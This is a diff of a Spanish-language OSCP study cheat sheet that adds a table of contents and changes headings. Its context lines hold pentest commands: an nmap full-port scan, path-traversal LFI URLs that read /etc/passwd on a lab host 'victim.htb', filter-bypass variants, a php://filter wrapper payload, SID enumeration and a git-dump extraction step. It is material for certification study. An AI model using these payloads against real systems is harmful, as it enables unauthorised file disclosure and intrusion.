@@ -4,9 +4,16 @@
 
 ![banner_oscp](https://user-images.githubusercontent.com/87484792/177843931-081eca92-24f1-4743-a632-48ee65b2ba4a.png)
 
+- [Enumeración - Fase Inicial](#enumeración)
+  
+- [Metodogolia WEB](#metodologia-web)
+  * [Enumeración de directorios](#enumeración-de-directorios---fuzzing)
+  * [Enumeración de subdominios](#enumeración-de-subdominios---fuzzing)
+  * [Enumeración de información Web](#información-basica-de-la-web)
+- [LFI](#lfi)
 
-# Enumeración - Fase Inicial
-## Enumeración de puertos
+
+# Enumeración
 
 `sudo nmap --minrate-5000 -p- -vvv -Pn -n -oG openPorts.txt <ip>` # Encontrar puertos con nmap </br>
 
@@ -66,7 +73,7 @@ Siendo vulnerable, podemos apuntar a otro fichero moviendonos entre directorios.
 
 `http://victim.htb/file.php?recurse=../../../../../etc/passwd` # Apuntamos a "passwd" movimiendonos de directorios.
 
-**ByPass LFI**
+### ByPass LFI
 
 ```
 http://victim.htb/file.php?recurse=../../../../../etc/passwd% 
@@ -79,7 +86,7 @@ http://victim.htb/file.php?recurse=....//....//....//....//....//etc/passwd
 
 ```
 
-**Wrappers LFI**
+### Wrappers LFI
 
 ```
 http://victim.htb/file.php?recurse=php://filter/read=string.rot13/resource=index.php
@@ -462,6 +469,4 @@ Encuentre más SID :lsaenumsid Ciclo RID (verifique más SID) :lookupsids <sid>
 
 `./extractor.sh /.git/ extracted` # Paso automatico para leer/recuperar el dumpeo del git.
 
-
-
-
+#### XXE
